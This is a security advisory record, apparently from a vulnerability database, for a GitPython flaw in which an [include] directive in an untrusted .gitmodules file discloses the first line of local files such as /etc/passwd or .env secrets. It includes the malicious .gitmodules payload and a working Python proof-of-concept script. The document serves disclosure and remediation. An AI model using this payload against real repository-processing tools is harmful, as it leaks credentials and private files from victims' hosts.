@@ -1,0 +1,184 @@
+{
+  "id": "GHSA-7833-fr7j-v32q",
+  "modified": "2026-09-08T18:45:10.860686865Z",
+  "published": "2026-09-08T18:38:51Z",
+  "aliases": [
+    "CVE-2026-78675",
+    "PYSEC-2026-3785"
+  ],
+  "summary": "GitPython: Arbitrary local file content disclosure via [include] directive in untrusted .gitmodules (SubmoduleConfigParser never disables merge_includes)",
+  "details": "# [HIGH] Arbitrary local file content disclosure via `[include]` directive in untrusted `.gitmodules` (`SubmoduleConfigParser` never disables `merge_includes`)\n\n- **CWE:** CWE-200 (Exposure of Sensitive Information) / CWE-73 (External Control of File Name or Path)\n- **Affected component:** `git/objects/submodule/base.py`, `Submodule._config_parser()` (~line 273) constructing `SubmoduleConfigParser(fp_module, read_only=read_only)`; `git/config.py`, `GitConfigParser.__init__` (`merge_includes` default), `GitConfigParser.read()`/`_included_paths()` (include-path resolution, ~lines 630-685), `GitConfigParser._read()` (~line 493-498, `MissingSectionHeaderError`)\n- **Affected version:** GitPython at HEAD (`9729ed3b948f2bde09f1f188c5311e172212b67e`, 2026-08-05, VERSION `3.1.58`)\n\n## Reachability\n`GitConfigParser.__init__` defaults `merge_includes=True`: any config file it parses has its `[include]` (and, when a `repo=` is supplied, `[includeIf ...]`) directives followed and merged in. The maintainers already recognized this as dangerous for one specific case and fixed it in commit `41ecc6a4` (\"Disable merge_includes in config writers\"), which passes `merge_includes=False` when `Repo.config_writer()` builds its parser (`git/repo/base.py`).\n\nThat fix never touched `Submodule._config_parser()`. This method builds the parser used for **every** read of a repo's submodule configuration — `repo.submodules`, `Submodule.iter_items()`, `Submodule.config()` — via `SubmoduleConfigParser(fp_module, read_only=read_only)`, passing neither `merge_includes=False` nor `repo=`. The `True` class default is therefore inherited unchanged, and `fp_module` here is `.gitmodules` — **the single most attacker-controlled config file in the entire codebase**, since it ships verbatim as tracked content inside any cloned repository.\n\n`GitConfigParser.read()`'s include-path resolution (~line 662-680) performs no containment check: `osp.isabs(include_path)` short-circuits the path join entirely for an absolute path, and a relative path is joined with `osp.join(osp.dirname(file_path), include_path)` / `osp.normpath()`'d with no check that the result stays under the repository. `~` is expanded via `osp.expanduser`. The only gate before opening is `os.access(include_path, os.R_OK)` — a readability check, not a path restriction.\n\nOnce opened, `GitConfigParser._read()` parses the target file as git-config INI. If the first non-blank/non-comment line is not a `[section]` header — true of virtually any non-gitconfig file (source code, `/etc/passwd`, `.env` files, credential files, logs, JSON/YAML) — it raises `configparser.MissingSectionHeaderError(fpname, lineno, line)`. Python's stdlib formats this exception's `str()` as `\"File contains no section headers.\\nfile: %r, line: %d\\n%r\" % (fpname, lineno, line)` — it embeds the **verbatim content** of that file's first line in the exception message. `Submodule.iter_items()` catches only `(IOError, BadName)`, not `configparser.Error`, so this exception propagates straight out of the ordinary, read-only `repo.submodules` call.\n\n## Root cause\nParity gap between two config-parser construction sites for the exact same footgun: `Repo.config_writer()` was hardened against `merge_includes` in 2023 (`41ecc6a4`); `Submodule._config_parser()` — which parses `.gitmodules`, content that is *always* attacker-controlled the moment a repository is cloned from an untrusted source — was never given the same treatment. (The submodule *write*-mode config parser at `git/objects/submodule/base.py` for `.git/modules/\u003cname\u003e/config` — a different, locally-generated file — has correctly passed `merge_includes=False` since 2022, underscoring that the omission for `.gitmodules` reads looks like an oversight rather than a considered exception.)\n\n## Exploit path\n1. Attacker crafts a repository whose `.gitmodules` contains a legitimate-looking `[submodule ...]` section plus:\n   ```\n   [include]\n   \tpath = /etc/passwd\n   ```\n   (an absolute path bypasses any traversal reasoning entirely; a relative `../../../../etc/passwd`-style path works too).\n2. Victim performs the extremely common, entirely read-only operation of enumerating a cloned repo's submodules: `list(repo.submodules)` (or any `for sm in repo.submodules`) — no `update()`, `init()`, or checkout of any kind required.\n3. `SubmoduleConfigParser` (inheriting `merge_includes=True`) follows the `[include]` directive, opens `/etc/passwd`, and `GitConfigParser._read()` raises `MissingSectionHeaderError` whose message embeds `/etc/passwd`'s first line verbatim.\n4. This exception surfaces wherever the host application observes exceptions from GitPython — CI logs, error pages, exception trackers, or any dependency-scanner/code-review-bot/hosting-platform tool built on `repo.submodules` — disclosing the targeted file's first line to the attacker (directly, or indirectly via any channel that echoes the error).\n\n## Impact\nNon-blind local file content disclosure (first line) of any file readable by the victim process, triggered purely by attacker-controlled repository content and one routine, read-only GitPython call. Bounded to one line per triggering file (parsing aborts at the first `MissingSectionHeaderError`), but that line very often *is* the secret — `.env` files (`DATABASE_URL=...`, `API_KEY=...`), single-line credential/token files, `/etc/passwd`'s root entry for host fingerprinting. The primitive additionally serves as a generic error-based file-existence oracle for arbitrary host paths. This is materially stronger than the already-fixed, explicitly **blind** `GHSA-cwvm-v4w8-q58c` (\"Blind local file inclusion\", CVSS 4.0, `git/refs/symbolic.py` ref-name resolution) — that advisory's own writeup states it cannot disclose content; this one does, verbatim, via a different module (`git/config.py`'s include resolution).\n\n## Preconditions\n- Victim clones (or otherwise opens with GitPython) a repository whose `.gitmodules` is attacker-controlled — the default trust model for any tool that processes third-party repositories (dependency scanners, CI, code hosting/review bots, \"audit this repo\" utilities — exactly the class of application GitPython itself is built for).\n- Victim performs any operation that touches `repo.submodules` — one of the most ordinary GitPython operations, requiring no submodule `update`/`init`/checkout.\n- No authentication/role requirement inside GitPython itself.\n\n## Evidence\n- `git/config.py` — `GitConfigParser.__init__` defaults `merge_includes=True`.\n- `git/objects/submodule/base.py:273` — `SubmoduleConfigParser(fp_module, read_only=read_only)` passes neither `merge_includes` nor `repo=`; `git blame` shows this call unchanged since the class was introduced, and `git show 41ecc6a4` confirms that commit touched only `git/repo/base.py`'s `Repo.config_writer()`, never this call site.\n- `git/config.py` `_included_paths()`/`read()` (~630-685) — absolute include paths bypass the join/normpath entirely (`osp.isabs()` short-circuit); no repository-boundary containment check exists anywhere in this path.\n- `git/config.py` `_read()` (~493-498) — raises `cp.MissingSectionHeaderError(fpname, lineno, line)` with the raw file line embedded, matching Python stdlib `configparser`'s own `__str__` behavior.\n- `Submodule.iter_items()` catches only `(IOError, BadName)` — `configparser.Error` (the base of `MissingSectionHeaderError`) is not swallowed.\n- PoC (`gitpython-003-poc.py`, embedded below) reproduces this end-to-end against this exact checkout via the public API only (`Repo.clone_from` + `list(repo.submodules)`, default arguments, no monkeypatching), against both a throwaway secret file and `/etc/passwd`.\n\n## False-positive check (adversarial re-read)\n- **Is this the same bug as `GHSA-hmq2-w58f-27jc`?** No — that advisory is about the `.gitmodules` submodule *name* driving `_module_abspath`/`os.makedirs()` (creating a git repository/module directory outside the working tree, a write/RCE-adjacent primitive via a completely different function). This finding is about the `[include]` directive in the *same file* reaching a config-parser read primitive — a different mechanism, different function, different impact class (content disclosure, not directory creation).\n- **Is this the same bug as `GHSA-cwvm-v4w8-q58c` (blind LFI)?** No — that advisory is explicitly documented by its own reporter as content-free/blind (existence-only), and lives in `git/refs/symbolic.py`'s ref-name resolution feeding `Repo.commit`/`tree`/`index.diff` — an entirely different module and code path. This finding discloses actual file content via `git/config.py`'s include-directive resolution.\n- **Is the impact overstated given only one line leaks?** No — this is an accurate scoping caveat already reflected in the severity/impact discussion, not a reachability blocker: attacker has full control over which path is targeted (absolute paths work unconditionally), requires zero interaction beyond the single most common submodule operation, and the PoC demonstrates a real, working end-to-end disclosure through the standard `clone_from` + `list(repo.submodules)` workflow.\n- **Could the exception simply be silently swallowed by GitPython before reaching the caller?** No — confirmed by reading `Submodule.iter_items()`'s exception handling, which catches only `IOError`/`BadName`; `configparser.MissingSectionHeaderError` propagates uncaught.\n- Verdict: no concrete blocker found. **CONFIRMED** — reproduced independently against both a throwaway secret file and `/etc/passwd`.\n\n## Remediation\nPass `merge_includes=False` when constructing `SubmoduleConfigParser` in `Submodule._config_parser()` (`git/objects/submodule/base.py`), mirroring the existing fix in `Repo.config_writer()` (commit `41ecc6a4`) — `.gitmodules` content is always attacker-controlled and should never be allowed to pull in `include`/`includeIf` directives. As defense in depth, `GitConfigParser.read()`'s include-path resolution should enforce that resolved include paths stay within the repository's own directory tree, and parsing-error messages (`MissingSectionHeaderError`/`ParsingError`) should avoid embedding raw file content when parsing a file the caller did not explicitly ask to open.\n\n## Confidence\nHigh. Root cause confirmed by direct code reading across both `git/config.py` and `git/objects/submodule/base.py`, cross-checked against the fix commit that hardened the sibling code path but not this one; exploit chain reproduced independently, twice, against the current HEAD (a throwaway secret file and `/etc/passwd`).\n\n\n## Proof-of-Concept source (`gitpython-003-poc.py`)\n\n```python\n#!/usr/bin/env python3\n\"\"\"\nGITPYTHON-003 PoC: `.gitmodules` -- fully attacker-controlled content shipped\ninside a cloned repository -- can contain `[include] path = \u003cany local path\u003e`.\n`Submodule._config_parser()` builds the parser used for `repo.submodules` (and\nother submodule reads) via `SubmoduleConfigParser(fp_module, read_only=...)`\nwithout passing `merge_includes=False`, so the class default `merge_includes=True`\nis inherited. GitConfigParser then opens the target file; if it isn't valid\ngit-config syntax (true of virtually any non-gitconfig file), Python's\n`configparser.MissingSectionHeaderError` embeds the file's first line verbatim\nin its exception message, which propagates out of the ordinary, read-only\n`repo.submodules` call -- a non-blind local file content disclosure primitive.\n\nRun:\n  PYTHONPATH=\"\u003crepo\u003e:\u003crepo\u003e/gitdb:\u003crepo\u003e/smmap\" python3 gitpython-003-poc.py \u003cworkdir\u003e \u003ctarget-file\u003e\n\nBenign: reads only the given \u003ctarget-file\u003e (defaults to a throwaway secret file\ncreated under \u003cworkdir\u003e if omitted) and never writes/exfiltrates it anywhere\nexcept printing it locally to prove the primitive. No destructive action.\n\"\"\"\nimport os\nimport subprocess\nimport sys\n\n\ndef main():\n    workdir = sys.argv[1] if len(sys.argv) \u003e 1 else \"/tmp/gitpython-003-poc\"\n    target_file = sys.argv[2] if len(sys.argv) \u003e 2 else os.path.join(workdir, \"secret.txt\")\n\n    attacker_repo = os.path.join(workdir, \"attacker-repo\")\n    dest = os.path.join(workdir, \"dest\")\n    for p in (attacker_repo, dest):\n        os.makedirs(p, exist_ok=True)\n\n    if not os.path.exists(target_file):\n        os.makedirs(os.path.dirname(target_file), exist_ok=True)\n        with open(target_file, \"w\") as f:\n            f.write(\"TOP-SECRET-DB-PASSWORD=hunter2-actual-secret-value\\n\")\n\n    subprocess.run([\"git\", \"init\", \"-q\", \"-b\", \"main\", attacker_repo], check=True)\n    subprocess.run([\"git\", \"-C\", attacker_repo, \"config\", \"user.email\", \"a@example.com\"], check=True)\n    subprocess.run([\"git\", \"-C\", attacker_repo, \"config\", \"user.name\", \"Attacker\"], check=True)\n\n    with open(os.path.join(attacker_repo, \"file.txt\"), \"w\") as f:\n        f.write(\"hello\\n\")\n\n    with open(os.path.join(attacker_repo, \".gitmodules\"), \"w\") as f:\n        f.write(\n            '[submodule \"totally-normal-dep\"]\\n'\n            \"\\tpath = vendor/dep\\n\"\n            \"\\turl = https://example.com/dep.git\\n\"\n            \"[include]\\n\"\n            \"\\tpath = %s\\n\" % target_file\n        )\n\n    subprocess.run([\"git\", \"-C\", attacker_repo, \"add\", \"file.txt\", \".gitmodules\"], check=True)\n    subprocess.run([\"git\", \"-C\", attacker_repo, \"commit\", \"-q\", \"-m\", \"init\"], check=True)\n\n    import git  # gitpython under test\n    import configparser\n\n    repo = git.Repo.clone_from(attacker_repo, dest)\n\n    try:\n        subs = list(repo.submodules)\n        print(\"NOT VULNERABLE: no exception raised, submodules =\", subs)\n        sys.exit(1)\n    except configparser.MissingSectionHeaderError as e:\n        msg = str(e)\n        print(\"VULNERABLE: MissingSectionHeaderError leaked file content via repo.submodules:\")\n        print(msg)\n        with open(target_file) as f:\n            first_line = f.readline().rstrip(\"\\n\")\n        if first_line in msg:\n            print(\"Confirmed: target file's first line is present verbatim in the exception message.\")\n            sys.exit(0)\n        else:\n            print(\"NOT VULNERABLE: exception message did not contain the expected content\")\n            sys.exit(1)\n\n\nif __name__ == \"__main__\":\n    main()\n\n```",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "gitpython",
+        "purl": "pkg:pypi/gitpython"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "3.1.59"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.1.7",
+        "0.2.0-beta1",
+        "0.3.0-beta1",
+        "0.3.0-beta2",
+        "0.3.1-beta2",
+        "0.3.2",
+        "0.3.2.1",
+        "0.3.2.RC1",
+        "0.3.3",
+        "0.3.4",
+        "0.3.5",
+        "0.3.6",
+        "0.3.7",
+        "1.0.0",
+        "1.0.1",
+        "1.0.2",
+        "2.0.0",
+        "2.0.1",
+        "2.0.2",
+        "2.0.3",
+        "2.0.4",
+        "2.0.5",
+        "2.0.6",
+        "2.0.7",
+        "2.0.8",
+        "2.0.9",
+        "2.0.9.dev0",
+        "2.0.9.dev1",
+        "2.1.0",
+        "2.1.1",
+        "2.1.10",
+        "2.1.11",
+        "2.1.12",
+        "2.1.13",
+        "2.1.14",
+        "2.1.15",
+        "2.1.2",
+        "2.1.3",
+        "2.1.4",
+        "2.1.5",
+        "2.1.6",
+        "2.1.7",
+        "2.1.8",
+        "2.1.9",
+        "3.0.0",
+        "3.0.1",
+        "3.0.2",
+        "3.0.3",
+        "3.0.4",
+        "3.0.5",
+        "3.0.6",
+        "3.0.7",
+        "3.0.8",
+        "3.0.9",
+        "3.1.0",
+        "3.1.1",
+        "3.1.10",
+        "3.1.11",
+        "3.1.12",
+        "3.1.13",
+        "3.1.14",
+        "3.1.15",
+        "3.1.16",
+        "3.1.17",
+        "3.1.18",
+        "3.1.19",
+        "3.1.2",
+        "3.1.20",
+        "3.1.22",
+        "3.1.23",
+        "3.1.24",
+        "3.1.25",
+        "3.1.26",
+        "3.1.27",
+        "3.1.28",
+        "3.1.29",
+        "3.1.3",
+        "3.1.30",
+        "3.1.31",
+        "3.1.32",
+        "3.1.33",
+        "3.1.34",
+        "3.1.35",
+        "3.1.36",
+        "3.1.37",
+        "3.1.38",
+        "3.1.4",
+        "3.1.40",
+        "3.1.41",
+        "3.1.42",
+        "3.1.43",
+        "3.1.44",
+        "3.1.45",
+        "3.1.46",
+        "3.1.47",
+        "3.1.48",
+        "3.1.49",
+        "3.1.5",
+        "3.1.50",
+        "3.1.51",
+        "3.1.52",
+        "3.1.53",
+        "3.1.54",
+        "3.1.55",
+        "3.1.56",
+        "3.1.57",
+        "3.1.58",
+        "3.1.6",
+        "3.1.7",
+        "3.1.8",
+        "3.1.9"
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 3.1.58",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-7833-fr7j-v32q/GHSA-7833-fr7j-v32q.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-7833-fr7j-v32q"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-78675"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/gitpython-developers/GitPython/pull/2211"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/gitpython-developers/GitPython/commit/ef7568e3b317ce617eacda39b8b54dcdff8c3b5c"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/gitpython-developers/GitPython"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/gitpython-developers/GitPython/releases/tag/3.1.59"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/pypa/advisory-database/tree/main/vulns/gitpython/PYSEC-2026-3785.yaml"
+    },
+    {
+      "type": "WEB",
+      "url": "https://www.vulncheck.com/advisories/gitpython-before-local-file-content-disclosure-via-gitmodules"
+    }
+  ]
+}
